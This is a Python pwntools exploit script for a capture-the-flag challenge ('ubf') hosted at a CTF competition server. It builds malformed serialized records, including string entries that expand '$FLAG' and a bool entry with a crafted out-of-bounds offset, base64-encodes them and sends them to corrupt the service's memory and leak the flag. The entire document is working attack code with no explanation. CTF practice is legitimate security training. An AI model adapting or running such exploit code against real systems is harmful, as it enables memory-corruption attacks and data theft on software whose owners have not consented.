from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./ubf')
p = remote("ubf.2023.ctfcompetition.com",1337)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def INT(l):
    data_len = 0
    pay = b''
    for x in l:
        pay+=p32(x)
    return p32(len(l)*4)+b'i'+p16(len(l))+p16(data_len)+pay
def BOOL(c,off=0):
    data_len = off
    return p32(len(c))+b'b'+p16(len(c))+p16(data_len)+c
def STR(var=[b"$FLAG"]):
    len_list = b''
    var_list = b''
    for x in var:
        len_list+=p16(len(x))
    for x in var:
        var_list+=x
    return p32(0x38)+b's'+p16(len(var))+p16(len(var)*2)+len_list+var_list
def payload(c):
    c = base64.b64encode(c)
    sla(b"ded:",c)
import base64
payload(BOOL(b'1')+STR()*5+INT([0xdeadbeef]*0x20)+BOOL(b'1',0x10000-0x12e))
p.interactive()